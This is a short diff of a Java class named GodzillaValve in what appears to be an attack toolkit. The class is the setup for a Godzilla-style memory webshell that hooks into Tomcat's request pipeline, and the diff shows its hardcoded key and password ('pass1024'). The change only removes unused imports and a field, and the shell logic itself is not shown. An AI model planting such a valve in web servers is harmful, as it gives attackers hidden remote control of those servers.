@@ -1,33 +1,22 @@
 package com.summersec.x;
 
-
-import com.summersec.attack.utils.Util;
 import org.apache.catalina.Pipeline;
 import org.apache.catalina.Valve;
 import org.apache.catalina.connector.Request;
-import org.apache.catalina.connector.RequestFacade;
 import org.apache.catalina.connector.Response;
-import org.apache.catalina.connector.ResponseFacade;
 import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.StandardContext;
-import org.apache.catalina.valves.ValveBase;
-
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.ServletContext;
 import javax.servlet.ServletException;
-import javax.servlet.ServletRequestWrapper;
-import javax.servlet.ServletResponseWrapper;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.lang.reflect.Field;
-import java.lang.reflect.Method;
 import java.math.BigInteger;
-import java.net.URL;
-import java.net.URLClassLoader;
 import java.security.MessageDigest;
 
 public class GodzillaValve extends ClassLoader implements Valve {
@@ -38,7 +27,6 @@ public class GodzillaValve extends ClassLoader implements Valve {
     String xc = "3c6e0b8a9c15224a";
     public String Pwd = "pass1024";
     String md5;
-    Class payload;
     String randomHeader = "default";
     public String cs = "UTF-8";
 
